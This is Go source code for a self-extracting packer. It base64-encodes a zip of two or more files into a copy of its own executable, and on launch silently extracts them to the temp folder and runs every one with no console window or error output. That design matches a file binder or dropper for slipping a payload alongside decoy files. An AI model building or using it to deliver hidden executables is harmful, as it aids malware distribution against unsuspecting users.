package main

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// 在实际部署时，可以使用以下命令编译为Windows GUI应用程序（无控制台窗口）
// go build -ldflags="-H windowsgui" -o pack.exe

// 主函数
func main() {
	// 检查是否是解压模式
	if isSelfExtracting() {
		// 自解压模式，静默运行
	extractAndRunFiles()
		return
	}

	// 解析命令行参数
	var outputPath string
	flag.StringVar(&outputPath, "o", "output.exe", "输出的可执行文件路径")
	flag.Parse()

	// 获取输入文件列表
	inputFiles := flag.Args()
	if len(inputFiles) < 2 {
		fmt.Println("使用方法: pack [选项] 文件1 文件2 [更多文件...]")
		fmt.Println("选项:")
		fmt.Println("  -o string   输出的可执行文件路径 (默认为 'output.exe')")
		os.Exit(1)
	}

	// 确保输出文件有.exe扩展名
	if !strings.HasSuffix(strings.ToLower(outputPath), ".exe") {
		outputPath += ".exe"
	}

	// 创建自解压可执行文件
	createSelfExtractingExe(inputFiles, outputPath)
}

// 判断是否是解压模式
func isSelfExtracting() bool {
	// 打开当前可执行文件
	exePath, err := os.Executable()
	if err != nil {
		return false
	}

	// 获取文件信息
	fileInfo, err := os.Stat(exePath)
	if err != nil {
		return false
	}
	fileSize := fileInfo.Size()

	// 如果文件太小，不可能包含嵌入的文件
	if fileSize < 10000 { // 增加阈值，确保能检测到嵌入的文件
		return false
	}

	// 读取文件末尾的标记
	readSize := int64(2048) // 读取更多内容以确保找到标记
	if fileSize < readSize {
		readSize = fileSize
	}

	// 打开文件并读取末尾内容
	file, err := os.Open(exePath)
	if err != nil {
		return false
	}
	defer file.Close()

	buffer := make([]byte, readSize)
	_, err = file.ReadAt(buffer, fileSize-readSize)
	if err != nil {
		return false
	}

	// 检查是否包含base64编码的结束标记
	containsMarker := bytes.Contains(buffer, []byte("PACKZIP_BASE64_END"))
	return containsMarker
}

// 解压并运行嵌入的文件
func extractAndRunFiles() {
	// 获取当前可执行文件路径
	exePath, err := os.Executable()
	if err != nil {
		time.Sleep(2 * time.Second)
		os.Exit(1)
	}

	// 打开可执行文件
	file, err := os.Open(exePath)
	if err != nil {
		time.Sleep(2 * time.Second)
		os.Exit(1)
	}
	defer file.Close()

	// 获取文件大小
	fileInfo, err := file.Stat()
	if err != nil {
		time.Sleep(2 * time.Second)
		os.Exit(1)
	}
	fileSize := fileInfo.Size()

	// 读取文件末尾查找标记
	readSize := int64(2048)
	if fileSize < readSize {
		readSize = fileSize
	}

	buffer := make([]byte, readSize)
	_, err = file.ReadAt(buffer, fileSize-readSize)
	if err != nil {
		time.Sleep(2 * time.Second)
		os.Exit(1)
	}

	// 查找base64编码的结束标记
	const marker = "PACKZIP_BASE64_END"
	markerIndex := bytes.LastIndex(buffer, []byte(marker))
	if markerIndex == -1 {
		time.Sleep(2 * time.Second)
		os.Exit(1)
	}

	// 读取嵌入文件的大小（前10个字符）
	startIndex := markerIndex - 10
	if startIndex < 0 {
		startIndex = 0
	}
	zipSizeBytes := buffer[startIndex:markerIndex]
	zipSizeStr := strings.TrimSpace(string(zipSizeBytes))

	var zipSize int64
	_, err = fmt.Sscanf(zipSizeStr, "%d", &zipSize)
	if err != nil {
		time.Sleep(2 * time.Second)
		os.Exit(1)
	}

	// 计算嵌入的ZIP文件的起始位置
	zipStartPos := fileSize - readSize + int64(startIndex) - zipSize

	// 创建临时目录，使用%TEMP%环境变量指定的位置
	tempDir, err := ioutil.TempDir(os.Getenv("TEMP"), "packzip_")
	if err != nil {
		time.Sleep(2 * time.Second)
		os.Exit(1)
	}

	// 从可执行文件中提取base64编码的数据
	file.Seek(zipStartPos, 0)
	encodedData := make([]byte, zipSize)
	_, err = io.ReadFull(file, encodedData)
	if err != nil {
		time.Sleep(2 * time.Second)
		os.Exit(1)
	}

	// 对数据进行base64解码
	zipData, err := base64.StdEncoding.DecodeString(string(encodedData))
	if err != nil {
		time.Sleep(2 * time.Second)
		os.Exit(1)
	}

	// 创建内存中的ZIP读取器
	zipReader, err := zip.NewReader(bytes.NewReader(zipData), int64(len(zipData)))
	if err != nil {
		time.Sleep(2 * time.Second)
		os.Exit(1)
	}

	// 解压所有文件
	var extractedFiles []string
	for _, zipFile := range zipReader.File {
		dstPath := filepath.Join(tempDir, zipFile.Name)
		extractedFiles = append(extractedFiles, dstPath)

		// 创建目录（如果需要）
		dir := filepath.Dir(dstPath)
		if err := os.MkdirAll(dir, 0755); err != nil {
			continue
		}

		// 打开ZIP中的文件
		r, err := zipFile.Open()
		if err != nil {
			r.Close()
			continue
		}

		// 创建目标文件
		dst, err := os.Create(dstPath)
		if err != nil {
			r.Close()
			continue
		}

		// 复制文件内容
		_, err = io.Copy(dst, r)
		dst.Close()
		r.Close()

		if err != nil {
			continue
		}

		// 设置文件权限
		if err := os.Chmod(dstPath, zipFile.Mode()); err != nil {
			// 忽略权限设置错误
		}
	}

	// 运行解压后的所有文件
	for _, filePath := range extractedFiles {
		// Windows路径需要处理，避免出现路径问题
		windowsFilePath := filepath.Clean(filePath)
		runFile(windowsFilePath)
		// 短暂延迟确保文件能被正确打开
		time.Sleep(100 * time.Millisecond)
	}

	// 不需要等待用户按键，直接静默退出
	time.Sleep(3 * time.Second) // 给文件打开的时间
	// 不清理临时目录，让系统自动处理或由用户手动清理
}

// 运行指定的文件（静默模式，不输出任何信息）
func runFile(filePath string) {
	// 方法1：使用cmd的start命令（最简单可靠的方法）
	cmd := exec.Command("cmd", "/c", "start", "", filePath)
	err := cmd.Run()
	if err == nil {
		return
	}

	// 方法2：使用PowerShell的Start-Process命令
	cmd = exec.Command("powershell", "Start-Process", filePath)
	err = cmd.Run()
	if err == nil {
		return
	}

	// 方法3：尝试直接运行可执行文件（针对.exe文件）
	if strings.ToLower(filepath.Ext(filePath)) == ".exe" {
		cmd = exec.Command(filePath)
		err = cmd.Start()
		if err == nil {
			return
		}
	}

	// 所有方法都失败了，静默处理错误，不显示任何信息
}

// 创建自解压可执行文件
func createSelfExtractingExe(inputFiles []string, outputPath string) {
	// 创建内存中的ZIP文件
	var zipBuffer bytes.Buffer
	zipWriter := zip.NewWriter(&zipBuffer)

	// 将输入文件添加到ZIP中
	for _, filePath := range inputFiles {
		fmt.Println("添加文件到ZIP:", filePath)
		// 打开输入文件
		srcFile, err := os.Open(filePath)
		if err != nil {
			fmt.Printf("无法打开文件 '%s': %s\n", filePath, err)
			continue
		}
		defer srcFile.Close()

		// 获取文件信息
		srcInfo, err := srcFile.Stat()
		if err != nil {
			fmt.Printf("无法获取文件信息 '%s': %s\n", filePath, err)
			continue
		}

		// 创建ZIP文件头部
		head, err := zip.FileInfoHeader(srcInfo)
		if err != nil {
			fmt.Printf("无法创建ZIP头部 '%s': %s\n", filePath, err)
			continue
		}

		// 使用文件名作为ZIP中的路径
		head.Name = filepath.Base(filePath)

		// 设置文件权限，确保可执行文件能够正确运行
		head.SetMode(srcInfo.Mode())

		// 创建ZIP文件条目
		writer, err := zipWriter.CreateHeader(head)
		if err != nil {
			fmt.Printf("无法创建ZIP条目 '%s': %s\n", filePath, err)
			continue
		}

		// 复制文件内容到ZIP
		_, err = io.Copy(writer, srcFile)
		if err != nil {
			fmt.Printf("无法复制文件内容 '%s': %s\n", filePath, err)
		}
	}

	// 确保ZIP写入完成
	zipWriter.Close()

	// 获取ZIP数据和大小
	zipData := zipBuffer.Bytes()
	zipSize := int64(len(zipData))
	fmt.Println("ZIP数据大小:", zipSize, "字节")

	// 获取当前可执行文件的路径
	selfPath, err := os.Executable()
	if err != nil {
		fmt.Println("无法获取当前可执行文件路径:", err)
		time.Sleep(5 * time.Second)
		os.Exit(1)
	}
	fmt.Println("当前可执行文件路径:", selfPath)

	// 检查当前可执行文件是否存在
	if _, err := os.Stat(selfPath); os.IsNotExist(err) {
		fmt.Println("错误: 当前可执行文件不存在。请先编译程序。")
		time.Sleep(5 * time.Second)
		os.Exit(1)
	}

	// 打开当前可执行文件和目标文件
	selfFile, err := os.Open(selfPath)
	if err != nil {
		fmt.Println("无法打开当前可执行文件:", err)
		time.Sleep(5 * time.Second)
		os.Exit(1)
	}
	defer selfFile.Close()

	// 获取当前可执行文件信息
	selfInfo, err := selfFile.Stat()
	if err != nil {
		fmt.Println("无法获取当前可执行文件信息:", err)
		time.Sleep(5 * time.Second)
		os.Exit(1)
	}
	
	// 创建目标可执行文件
	destFile, err := os.Create(outputPath)
	if err != nil {
		fmt.Println("无法创建目标可执行文件:", err)
		time.Sleep(5 * time.Second)
		os.Exit(1)
	}
	defer destFile.Close()

	// 将当前可执行文件复制到目标文件
	fmt.Println("复制可执行文件内容...")
	_, err = io.Copy(destFile, selfFile)
	if err != nil {
		fmt.Println("复制可执行文件内容失败:", err)
		time.Sleep(5 * time.Second)
		os.Exit(1)
	}

	// 对ZIP数据进行base64编码
	encodedData := base64.StdEncoding.EncodeToString(zipData)
	encodedSize := int64(len(encodedData))
	fmt.Println("ZIP数据已进行base64加密编码")

	// 追加base64编码后的数据到目标文件
	fmt.Println("追加base64编码数据到可执行文件...")
	destFile.Write([]byte(encodedData))

	// 写入编码后的数据大小和结束标记（使用新标记表示base64编码）
	fmt.Println("写入结束标记...")
	fmt.Fprintf(destFile, "%10dPACKZIP_BASE64_END", encodedSize)

	// 设置目标文件为可执行
	if err := os.Chmod(outputPath, selfInfo.Mode()|0111); err != nil {
		fmt.Println("设置可执行权限失败:", err)
	}

	fmt.Printf("\n自解压可执行文件已创建: %s\n", outputPath)
	fmt.Println("双击该文件将会自动解压并打开所有打包的文件。")
	fmt.Println("注意: 如果双击无法运行，请尝试右键点击并选择'以管理员身份运行'。")
}
